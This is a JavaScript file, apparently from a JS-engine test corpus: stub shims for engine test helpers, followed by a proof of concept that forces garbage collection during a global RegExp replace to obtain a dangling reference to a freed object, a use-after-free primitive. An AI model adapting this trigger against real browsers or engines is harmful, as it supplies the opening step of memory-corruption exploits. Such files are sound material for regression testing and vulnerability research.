function gc() {
    for (let i = 0; i < 10; i++) {
      new ArrayBuffer(1024 * 1024 * 10);
    }
}

function noInline() {
}

function OSRExit() {
}

function ensureArrayStorage() {
}

function fiatInt52(i) {
	return i;
}

function noDFG() {
}

function noOSRExitFuzzing() {
}

function isFinalTier() {
	return true;
}

function transferArrayBuffer() {
}

function fullGC() {
	if (gc !== undefined) 
		gc();
	else
		CollectGarbage();
}

function edenGC() {
	if (gc !== undefined) 
		gc();
	else
		CollectGarbage();
}

function forceGCSlowPaths() {
	if (gc !== undefined) 
		gc();
	else
		CollectGarbage();
}

function noFTL() {

}

function debug(x) {
	console.log(x);
}

function describe(x) {
	console.log(x);
}

function isInt32(i) {
	return (typeof i === "number");
}

function BigInt(i) {
	return i;
}

if (typeof(console) == "undefined") {
    console = {
        log: print
    };
}

if (typeof(gc) == "undefined") {
  gc = function() {
    for (let i = 0; i < 10; i++) {
      new ArrayBuffer(1024 * 1024 * 10);
    }
  }
}

if (typeof(BigInt) == "undefined") {
  BigInt = function (v) { return new Number(v); }
}

if (typeof(BigInt64Array) == "undefined") {
  BigInt64Array = function(v) { return new Array(v); }
}

if (typeof(BigUint64Array) == "undefined") { 
  BigUint64Array = function (v) { return new Array(v); }
}

if (typeof(quit) == "undefined") {
  quit = function() {
  }
}

function i_want_to_break_free() {
  var n = 0x40000;
  var m = 10;
  var regex = new RegExp("(ab)".repeat(n), "g"); // g flag to trigger the vulnerable path

  var part = "ab".repeat(n); // matches have to be at least size 2 to prevent interning

  var s = (part + "|").repeat(m);

  while (true) {
    var cnt = 0;
    var ary = [];
    s.replace(regex, function () {
      for (var i = 1; i < arguments.length - 2; ++i) {
        if (typeof arguments[i] !== 'string') {
          i_am_free = arguments[i];
          throw "success";
        }

        ary[cnt++] = arguments[i]; // root everything to force GC
      }

      return "x";
    });
  }
}

try {
  i_want_to_break_free();
} catch (e) {
  ;
}

console.log(typeof i_am_free); // will print "object"
